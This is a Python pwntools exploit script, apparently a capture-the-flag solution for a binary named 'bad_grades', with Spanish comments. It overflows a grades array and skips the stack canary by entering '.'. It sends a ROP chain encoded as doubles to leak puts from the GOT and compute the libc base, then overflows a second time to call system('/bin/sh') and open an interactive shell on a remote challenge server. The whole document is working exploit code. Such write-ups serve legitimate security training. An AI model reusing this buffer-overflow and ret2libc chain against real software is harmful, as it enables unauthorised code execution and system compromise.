from pwn import *
import struct

gs = '''
break *0x4010ec
continue
'''

elf = context.binary = ELF("./bad_grades_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("94.237.50.83", 40591)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def f(x):
	# Convertir a bytes
	address_bytes = struct.pack('<Q', x)

	# Convertir los bytes a un valor double
	decimal_double = struct.unpack('d', address_bytes)[0]

	return decimal_double

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendlineafter("> ", b"2")

io.sendlineafter(": ", b"39")

for i in range(33):
    io.sendlineafter(": ", b"1")

# Lo clave para bypassear canary es este sagrado punto sabes? xD
io.sendlineafter(": ", ".")
#print(elf.got)
#for i in range(3):
#    io.sendlineafter(": ", b"1337")
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

main_address = 0x401108

io.sendlineafter(": ", str(f(0x0000000000424242)).encode()) # Aca esta el overwrite de ret
io.sendlineafter(": ", str(f(pop_rdi)).encode()) # Aca esta el overwrite de ret
io.sendlineafter(": ", str(f(elf.got.puts)).encode()) 
io.sendlineafter(": ", str(f(elf.plt.puts)).encode())
io.sendlineafter(": ", str(f(main_address)).encode())

io.recvline()
#"""
#leak_address = io.recvline().strip() + b"\x0a" + io.recvline().strip() # Este si funciona en local xD
leak_address = io.recvline().strip()

leak_address = u64(leak_address.ljust(8, b"\x00"))

print(f"[+] Leak Address: {hex(leak_address)}")

libc.address = leak_address - libc.sym._IO_puts

print(f"[+] System: {hex(libc.sym.system)}")

# Nuevamente volvemos a generar el overflow xD

io.sendlineafter("> ", b"2")

io.sendlineafter(": ", b"39")

for i in range(33):
    io.sendlineafter(": ", b"1")

io.sendlineafter(": ", ".")

io.sendlineafter(": ", str(f(0x0000000000424242)).encode()) # Aca esta el overwrite de ret
io.sendlineafter(": ", str(f(pop_rdi)).encode()) # Aca esta el overwrite de ret
io.sendlineafter(": ", str(f(next(libc.search(b'/bin/sh')))).encode()) 
io.sendlineafter(": ", str(f(ret)).encode())
io.sendlineafter(": ", str(f(libc.sym.system)).encode())
#"""
io.interactive()
